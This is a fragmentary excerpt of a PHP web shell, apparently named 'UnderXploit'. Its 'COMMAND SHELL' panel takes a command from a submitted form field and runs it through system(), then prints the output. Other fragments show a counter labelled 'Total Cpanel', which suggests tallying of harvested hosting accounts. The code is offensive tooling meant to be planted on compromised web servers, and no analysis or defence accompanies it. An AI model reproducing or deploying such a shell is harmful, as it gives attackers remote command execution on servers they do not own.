...
<link rel="stylesheet" href="i/css/i.css" />
<link rel="stylesheet" href="udx.css" />
...
break;
	default:
		print "<div class='coL-option top'>Total : <span class='label-success'> ".$i." <span></div></div>";
}
break;
...
print '</table>';
$total = $dc;
print '<div class="coL-option top" style="">Total Cpanel : <span class="label label-default">'.$total.'</span></div></div>';
break;
...
break;
	...
	case 'cmd': print '<div class="coL-panel"><table><td class="td-panel"><center><div class="loader"></div></center></td><td class="td-panel-right">COMMAND SHELL</td></table></div>';
	print '<div class="coL-option">';
...
if(isset($_UNDERXPLOIT['cmd']) && $_UNDERXPLOIT['cmd']!='') {
	...
	$rc = scop(system($_UNDERXPLOIT['cmd'].' 2>&1'));
if($rc == NULL) {
...
<table style="margin-top:7px" cellspacing="0"><form method="POST" action="?' . x7 . 'cmd&' . x5 . $dir . '">
	...
	<td style="width:70%;padding-left:3px;padding-right:3px"><input type="text" placeholder="" name="cmd"></td><td style="width:20%;text-align:right"><button type="submit" class="btn-exe"><i class="zmdi zmdi-long-arrow-return zmdi-hc-fw"></i></button></form></td>
	</table></div></div>';
break;
...
<table style="margin-top:15px"><form method="POST" action="?' . x7 . 'cmd&' . x5 . $dir . '">
	<td align="center" style="width:10%"><i class="zmdi zmdi-chevron-right zmdi-hc-fw"></i></td>
	<td style="width:70%"><input type="text" placeholder="Command Shell" name="cmd"></td><td style="width:20%;text-align:right"><button type="submit" class="btn-exe"><i class="zmdi zmdi-long-arrow-return zmdi-hc-fw"></i></button></form></td>
	</table>
</div>
